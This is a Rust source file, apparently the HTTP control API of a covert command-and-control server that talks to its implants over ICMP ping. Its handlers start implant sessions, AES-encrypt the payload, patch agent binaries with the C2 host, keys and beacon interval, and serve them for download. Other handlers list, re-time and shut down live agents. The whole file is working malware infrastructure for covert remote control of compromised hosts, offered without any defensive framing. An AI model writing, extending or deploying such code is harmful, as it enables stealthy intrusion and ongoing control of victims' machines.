use crate::{environment, patcher, workers::session, CHANNEL, GLOBAL_CONF, KEY, SESSIONS};
use aes::cipher::block_padding::Pkcs7;
use aes::cipher::{BlockEncryptMut, KeyInit};
use covert_c2_ping_common::{
    ClientConfig, DeleteAgent, NewAgent, PatchAgent, PingMessage, SessionData, KEY_SIZE,
};
use std::{
    collections::HashMap,
    sync::atomic::{AtomicU16, Ordering},
    time::Duration,
};
use tokio::task;
use warp::{http::Response, Filter, Rejection, Reply};

pub async fn worker() {
    let patch = warp::patch()
        .and(warp::body::json::<PatchAgent>())
        .and_then(patch_agent);

    let get = warp::get().and_then(get_agent_list);

    let post = warp::post()
        .and(warp::body::json::<NewAgent>())
        .and_then(post_agent);

    let delete = warp::delete()
        .and(warp::body::json::<DeleteAgent>())
        .and_then(delete_agent);

    let api = warp::path!("api" / "agents").and(get.or(post).or(patch).or(delete));

    let root = warp::filters::fs::dir(environment::get_static_path());
    warp::serve(api.or(root)).bind(([0, 0, 0, 0], 8080)).await;
}

static AGENT_COUNT: AtomicU16 = AtomicU16::new(1);

async fn post_agent(new_agent: NewAgent) -> Result<impl Reply, Rejection> {
    tracing::info!("New agent request");
    let (payload, connection) =
        covert_server::start_implant_session(&GLOBAL_CONF.ts, &new_agent.arch, &new_agent.pipe)
            .await
            .or(Err(warp::reject::reject()))?;
    tracing::info!("Got payload len:{}", payload.len());

    let payload_key: [u8; KEY_SIZE] = rand::random();
    let encryptor = aes::Aes256Enc::new_from_slice(&payload_key).or(Err(warp::reject::reject()))?;
    let payload = encryptor.encrypt_padded_vec_mut::<Pkcs7>(&payload);

    let id: u16 = AGENT_COUNT.fetch_add(1, Ordering::SeqCst);
    task::spawn(session::worker(connection, id, new_agent.arch.clone()));

    CHANNEL
        .lock()
        .await
        .put_message(PingMessage::KeyMessage(payload_key), id);

    let req_conf: ClientConfig = ClientConfig {
        id,
        key: *KEY,
        host: &new_agent.host,
        pipe: &new_agent.pipe,
        payload: &payload,
        sleep: new_agent.sleep,
    };

    match patcher::get_patched_bin(req_conf, new_agent.arch).await {
        Ok(bin) => {
            tracing::info!("Sending patched agent");
            let response = Response::builder()
                .body(bin)
                .or(Err(warp::reject::reject()))?;
            Ok(response)
        }
        Err(e) => {
            tracing::info!("{:?}", e);
            Err(warp::reject())
        }
    }
}

async fn delete_agent(config: DeleteAgent) -> Result<impl Reply, Rejection> {
    SESSIONS.lock().await.remove(&config.agentid);
    CHANNEL
        .lock()
        .await
        .put_message(PingMessage::CloseMessage, config.agentid);
    Ok(warp::reply())
}

async fn patch_agent(config: PatchAgent) -> Result<impl Reply, Rejection> {
    if let Some(sleep) = config.sleep {
        CHANNEL.lock().await.put_message(
            PingMessage::SleepMessage(Duration::from_secs(sleep)),
            config.agentid,
        );
        return Ok(warp::reply());
    };
    Err(warp::reject())
}

async fn get_agent_list() -> Result<impl Reply, Rejection> {
    let sessions: HashMap<u16, SessionData> = SESSIONS
        .lock()
        .await
        .iter()
        .map(|(key, (_, val))| (*key, val.clone()))
        .collect();
    Ok(warp::reply::json(&sessions))
}
